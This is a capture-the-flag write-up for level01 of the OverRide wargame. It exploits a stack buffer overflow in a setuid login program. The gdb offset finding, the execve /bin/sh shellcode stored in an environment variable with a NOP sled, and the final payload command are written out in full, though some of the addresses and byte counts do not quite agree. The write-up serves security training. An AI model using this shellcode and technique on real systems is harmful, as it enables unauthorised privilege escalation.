# 1st Step
  
List the files will show us `level01` executable
```
level01@OverRide:~$ ls -l
total 8
-rwsr-s---+ 1 level02 users 7360 Sep 10  2016 level01
level01@OverRide:~$ ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: bla
verifying username....

nope, incorrect username...

level01@OverRide:~$
```
The program waits for a username/password and exit if it's not good.  
After analyze it with gdb we can find three interesting functions : `main()`, `verify_user_name` and `verify_user_pass`.  
Please refer to file [asm_analysis.md](https://github.com/maxisimo/42-OverRide/blob/main/level01/Ressources/asm_analysis.md) in parallel of [source.c](https://github.com/maxisimo/42-OverRide/blob/main/level01/source.c) for more details.  
A first read of ASM code allows us to see that function `verify_user_name` compares the user name to "dat_wil" and function `verify_user_pass` compares password to "admin".  
By looking closely to the code we can see that finding the password won't help us! Since there is no calls to `/bin/sh`, we can assume we'll have to use a shellcode this time.  
We'll have to write over `eip`, so first get the offset :
```
(gdb) run
Starting program: /home/users/level01/level01
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
```
Thanks to the pattern generator we found an offset of 80.  
As the program use `fgets()` function we should not be able to make a buffer overflow but `fgets()` take a max string of 100 chars wich is more than the offset of `eip`.  

## Create our exploit
*shellcode found [here](http://shell-storm.org/shellcode/files/shellcode-827.php)*  
In order to store our shellcode, we can use environment variables :
```
level01@OverRide:~$ export SHELLCODE=`python -c 'print "\x90" * 50 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'`
level01@OverRide:~$ env | grep SHELLCODE
SHELLCODE=��������������������������������������������������1�Ph//shh/bin��PS��
                                                                                ̀
level01@OverRide:~$
```
Find its address with gdb and add some bytes to the address founded in order to jump into the nop sled :
```
(gdb) set disassembly-flavor intel
(gdb) disass main
Dump of assembler code for function main:
[...]
  0x0804856d <+157>:	lea    eax,[esp+0x1c]    // buffer start
[...]
(gdb)  b *main+157
Breakpoint 1 at 0x804856d
(gdb) run
Starting program: /home/users/level01/level01
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:

Breakpoint 1, 0x0804856d in main ()
(gdb) x $ebp-0x1008
0xbfffe680:     0x00000000
(gdb)
```
Our input will be as follow :
bytes 0-7: "dat_wil", to pass the `verify_user_name` function.
byte  8: '\n', so that the first `fgets` stops taking user input
bytes 9-89: padding (80 to overwrite EIP with the next 4 bytes) 
bytes 90-94: 0xffffd668 + 20 => 0xffffd67c (sometimes, gdb will give us a wrong address so that's why we added nop sled in the environment variable SHELLCODE)

(python -c 'print "dat_wil" + "\n" + "a" * 80 + "address shellcode reversed"'; cat) | ./level01
